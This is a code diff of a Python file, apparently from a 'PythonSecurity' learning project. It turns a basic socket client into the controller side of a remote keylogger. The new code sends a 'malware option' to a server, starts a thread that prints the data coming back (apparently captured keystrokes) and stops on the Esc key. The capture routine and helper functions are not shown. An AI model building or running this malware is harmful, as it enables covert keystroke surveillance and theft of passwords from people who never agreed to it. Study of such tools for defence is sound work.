@@ -1,24 +1,41 @@
-import socket
+import threading
+from pynput.keyboard import Key
+import time
+from PythonSecurity.utils import *
 
-def client_program():
-    # get the hostname
-    port = 1236
+disconnect_socket = threading.Event()
+started_keylogger = threading.Event()
 
-    #ipv4 of the host machine
-    host = "192.168.10.86"
+def keylogger(client_socket):
+    time.sleep(1)
+    send_malware_option(client_socket, '2')
 
-    client_socket = socket.socket()
-    client_socket.connect((host, port))  # connect to the server
+    while not disconnect_socket.is_set():
+        try:
+            data = receive_from_server(client_socket)
+            print(f"Received: {data}")
+        except (BlockingIOError, ConnectionResetError, BrokenPipeError):
+            pass
 
-    while True:
-        # receive data stream. it won't accept data packet greater than 1024 bytes
-        data = client_socket.recv(1024).decode()
-        if not data:
-            # if data is not received break
-            break
-        print("from server: " + str(data))
+    print("Keylogger thread is stopping")
+    return False
 
-    client_socket.close()  # close the connection
+def on_kill(key):
+    if key == Key.esc and started_keylogger.is_set():
+        disconnect_socket.set()
+        return False  # Stop the listener
 
-if __name__ == '__main__':
-    client_program()
+def start_key_logger():
+    client_unblocked_socket = make_and_connect_unblocked_socket_to_server()
+    keylogger_thread = make_thread(keylogger, client_unblocked_socket)
+    started_keylogger.set()
+    keylogger_thread.start()
+
+    with make_keyboard_listener(on_kill) as escape_key_listener:
+        escape_key_listener.join()
+
+    keylogger_thread.join()
+
+    if disconnect_socket.is_set():
+        disconnect_socket.clear()
+        disconnect(client_unblocked_socket)  # Disconnect from the socket
